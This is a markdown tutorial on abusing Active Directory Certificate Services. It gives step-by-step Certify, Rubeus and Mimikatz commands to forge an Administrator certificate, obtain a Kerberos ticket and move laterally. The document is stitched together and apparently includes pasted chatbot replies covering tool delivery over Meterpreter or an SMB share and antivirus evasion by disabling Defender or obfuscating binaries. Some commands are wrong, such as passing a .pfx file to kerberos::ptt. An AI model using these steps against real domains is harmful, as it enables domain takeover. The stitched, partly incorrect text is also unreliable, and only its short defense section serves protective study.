```markdown
# Abusing Active Directory Certificate Services (AD CS): Easy Examples and Explanations

This document provides an overview of Active Directory Certificate Services (AD CS), common misconfigurations, and how attackers can abuse AD CS for privilege escalation and lateral movement. Each section includes easy-to-follow examples and insights from the "Certified Pre-Owned" article by SpecterOps.

---

## Understanding the Role of Active Directory Certificate Services (AD CS)

Active Directory Certificate Services (AD CS) is a crucial component within a Windows domain that provides public key infrastructure (PKI) services. It enables the creation, management, and distribution of digital certificates, which are used to secure communications, authenticate users, and ensure data integrity.

### Key Roles of AD CS
1. **Issuing Certificates**:
   - Certificates are issued for encrypting emails, securing web traffic (SSL/TLS), and authenticating users and devices.
2. **Authenticating Users and Machines**:
   - Certificates enable smart card logins and multi-factor authentication (MFA).
3. **Securing Communications**:
   - Certificates encrypt data in transit, such as HTTPS traffic and VPN connections.
4. **Supporting Encryption and Digital Signatures**:
   - Certificates ensure data confidentiality, integrity, and non-repudiation.

---

## Common Misconfigurations in AD CS

Misconfigurations in AD CS can lead to significant security vulnerabilities, allowing attackers to exploit the system.

### Common Misconfigurations
1. **Overly Permissive Enrollment Permissions**:
   - Templates allow any authenticated user to request certificates.
2. **Weak Cryptographic Settings**:
   - Templates use short key lengths or weak algorithms.
3. **User-Controlled Subject Names**:
   - Templates allow users to specify subject names, enabling impersonation.
4. **Autoenrollment Misconfigurations**:
   - Certificates are automatically issued without proper validation.

### Example: Identifying Misconfigured Templates
1. **Tool**: Certify
2. **Command**:
   ```plaintext
   Certify.exe find /vulnerable
   ```
3. **Output**:
   ```plaintext
   Vulnerable Template: UserTemplate
   Permissions: Domain Users can enroll
   ```
4. **Explanation**:
   - The `UserTemplate` template is vulnerable because it allows any domain user to enroll certificates.

---

## Performing Attacks to Abuse AD CS

Attackers can exploit AD CS misconfigurations to forge certificates, impersonate users, and escalate privileges.

### Example 1: Certificate Request Forgery
1. **Objective**:
   - Request a certificate for a high-privilege account (e.g., `Administrator`).

2. **Tool**: Certify
3. **Command**:
   ```plaintext
   Certify.exe request /ca:<CA-name> /template:<template-name> /altname:<target-username>
   ```
   - **Explanation**:
     - `/ca:<CA-name>`: Specifies the Certificate Authority.
     - `/template:<template-name>`: Specifies the vulnerable template.
     - `/altname:<target-username>`: Specifies the target username (e.g., `Administrator`).

4. **Output**:
   ```plaintext
   Certificate successfully requested and saved as admin_cert.pfx
   ```
5. **Use Case**:
   - Use the certificate to authenticate as the target user.

---

### Example 2: Exploiting Vulnerable Templates
1. **Objective**:
   - Use a misconfigured template to request a certificate for domain admin access.

2. **Tool**: Rubeus
3. **Command**:
   ```plaintext
   Rubeus.exe asktgt /user:<username> /certificate:<path-to-cert> /password:<password>
   ```
   - **Explanation**:
     - `/user:<username>`: Specifies the username.
     - `/certificate:<path-to-cert>`: Specifies the path to the certificate.
     - `/password:<password>`: Specifies the password for the certificate.

4. **Output**:
   ```plaintext
   TGT successfully requested for user: Administrator
   ```
5. **Use Case**:
   - Use the TGT (Ticket Granting Ticket) to perform privilege escalation or lateral movement.

---

## Using AD CS for Privilege Escalation and Lateral Movement

Attackers can use certificates obtained through AD CS to escalate privileges or move laterally within a domain.

### Example: Using a Certificate for Lateral Movement
1. **Objective**:
   - Authenticate to another machine in the domain using a stolen certificate.

2. **Tool**: Mimikatz
3. **Command**:
   ```plaintext
   mimikatz # kerberos::ptt admin_cert.pfx
   ```
   - **Explanation**:
     - `kerberos::ptt`: Passes the ticket to the current session.
     - `admin_cert.pfx`: Specifies the stolen certificate.

4. **Outcome**:
   - The attacker is authenticated as the `Administrator` and can access other machines in the domain.

---

## Lab Environment and Tools

### Tools Used
1. **Certify**:
   - Enumerates certificate templates and identifies vulnerabilities.
2. **Rubeus**:
   - Requests Kerberos tickets using forged certificates.
3. **Mimikatz**:
   - Passes Kerberos tickets to authenticate as privileged users.

### Lab Setup
- Use nested Hyper-V machines in the Cloud Labs environment.
- Ensure the Certificate Authority (CA) and vulnerable templates are configured for testing.

---

## Teaching Points and Defense Strategies

### Critical Analysis of Misconfigurations
- Small misconfigurations in AD CS can lead to significant security breaches.
- Regular audits and proper configuration are essential to mitigate risks.

### Defense in Depth
- Implement layered security measures, such as:
  - Monitoring certificate requests.
  - Enforcing least privilege.
  - Regularly auditing certificate templates.

### Real-World Implications
- AD CS attacks have been used in advanced persistent threat (APT) campaigns.
- Properly securing AD CS is critical to maintaining the integrity of a Windows domain.

---

## Security Considerations

- **Audit AD CS**:
  - Regularly review certificate templates and permissions to identify vulnerabilities.
- **Restrict Permissions**:
  - Limit who can enroll and manage certificates.
- **Enable Certificate Revocation**:
  - Ensure revoked certificates cannot be used.
- **Monitor Certificate Requests**:
  - Track and log all certificate requests for suspicious activity.



Great question — let's break it down:

To **demonstrate the AD CS abuse attack using Certify and Rubeus**, here’s what roles each VM plays and **where you use each tool**:

---

### 🧠 **Environment Roles**
- **Kali VM** – Attacker machine (running tools, PowerShell through Meterpreter, or remote shells).
- **Domain-joined Windows VM (victim)** – This is where **Certify and Rubeus** are used, either directly or through a shell session (like Meterpreter).
- **Domain Controller (DC)** – Runs Active Directory, CA (Certificate Authority), and contains targets like domain admins and CA configs.

---

### ✅ **Tool Usage Breakdown**

#### 1. **Run `Certify.exe` on the Windows target (domain-joined VM)**  
You need to be **authenticated to the domain**, even as a low-privileged user. Certify will enumerate AD CS settings.

- 🛠️ How:
  - Get a Meterpreter session or RDP into the domain-joined Windows VM.
  - Upload and run `Certify.exe`:
    ```powershell
    Certify.exe find /vulnerable
    ```
  - This tells you which certificate templates are vulnerable.

---

#### 2. **Request a Malicious Certificate (Still on Domain-Joined VM)**  
After finding a vulnerable template:
```powershell
Certify.exe request /ca:<CAName> /template:<TemplateName> /altname:<Domain\Username>
```

- Example:
  ```powershell
  Certify.exe request /ca:dc01.megacorpone.local\megacorp-CA /template:User /altname:megacorpone\Administrator
  ```

- This gives you a **.pfx certificate file** (with a private key), that can be used to impersonate the domain admin.

---

#### 3. **Use `Rubeus` on the same Windows VM**  
Use that forged cert to get a TGT (Kerberos ticket):
```powershell
Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /password:<PFX_password>
```

- If successful, you now have a TGT as **Administrator**.
- Use `Rubeus.exe tgtinject /ticket:<base64_TGT>` to inject the ticket into the session.

---

### ❓ Can you run Certify/Rubeus on Kali?

> ❌ Not directly — they are **Windows binaries** written in .NET, meant to run on **Windows systems that are domain-joined**.

However, you can:
- Use Kali to **pivot** into the domain-joined Windows host (e.g., with Meterpreter).
- **Upload** `Certify.exe` or `Rubeus.exe` using Meterpreter’s `upload` command.
- Run them using Meterpreter's shell or PowerShell support.

---

### 🧰 Summary Table

| Tool       | Location               | Requires Domain-Joined? | Purpose                                 |
|------------|------------------------|--------------------------|-----------------------------------------|
| Certify    | Domain-Joined Windows  | ✅ Yes                   | Find vulnerable templates / request cert |
| Rubeus     | Domain-Joined Windows  | ✅ Yes                   | Use cert to get Kerberos TGT            |
| Kali       | Attacker VM            | ❌ No                    | Launch attacks, upload tools            |

---

No problem — Certify and Rubeus don’t come pre-installed on Windows. You have to **manually download them**, and there are a few steps involved since they’re usually detected by antivirus (so often AV needs to be disabled or bypassed).

Here’s how you can get them on your Windows VM:

---

### 🔽 Step 1: Download Certify and Rubeus on Kali

You should **never download these tools directly from the victim machine** — instead, download them on Kali and then upload to the Windows VM.

#### 💡 Option A: Use GitHub (on Kali)
```bash
# Clone the GhostPack tools repo (has Certify source)
git clone https://github.com/GhostPack/Certify.git
git clone https://github.com/GhostPack/Rubeus.git
```

These are **source code**, so you'll need to compile them **with Visual Studio** or download precompiled versions.

---

### ✅ Step 2: Download Precompiled Binaries (Safer Way)

Use Kali to download them from reputable sources like:
- [https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

Or use `wget`:
```bash
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

---

### 📤 Step 3: Upload to Windows VM via Meterpreter

Once you have a Meterpreter session on the domain-joined Windows machine:

```bash
meterpreter > upload Certify.exe
meterpreter > upload Rubeus.exe
```

Or, if you have a shared folder or remote access:

- Use `smbserver.py` to share the folder from Kali:
  ```bash
  impacket-smbserver share ./tools
  ```

- On the Windows VM:
  ```cmd
  copy \\<kali_ip>\share\Certify.exe C:\Users\Public\
  ```

---

### 🏃 Step 4: Run Them on the Windows VM

Now that they're on the victim:
```cmd
Certify.exe find /vulnerable
```
And later:
```cmd
Rubeus.exe asktgt /certificate:<pfx_path>
```

---

### ⚠️ Important Notes

- AV may **delete or block** these tools. Disable Defender or use **obfuscated versions** or rename the files.
- Don’t run them on non-domain-joined hosts — they need domain access.
- Use Meterpreter `ps` to confirm you're running in a user context that’s part of the domain.

---

By understanding these techniques and practicing the examples, you can effectively identify and exploit misconfigurations in AD CS while adhering to ethical guidelines.
```
